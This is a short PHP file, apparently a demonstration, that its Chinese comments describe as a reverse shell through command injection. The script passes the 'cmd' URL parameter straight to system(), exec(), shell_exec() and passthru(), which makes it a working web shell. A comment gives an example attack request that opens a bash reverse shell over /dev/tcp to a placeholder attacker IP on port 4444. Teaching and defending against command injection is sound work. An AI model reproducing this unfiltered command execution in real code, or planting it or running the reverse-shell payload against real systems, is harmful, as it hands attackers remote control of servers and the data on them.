<?php
// 命令注入漏洞导致的反弹shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // 直接执行用户输入的命令
    system($cmd);
    // 或者
    exec($cmd);
    // 或者
    shell_exec($cmd);
    // 或者
    passthru($cmd);
}

// 示例调用(攻击者可以输入):
// http://example.com/command_injection_shell.php?cmd=bash -i >& /dev/tcp/攻击者IP/4444 0>&1
?>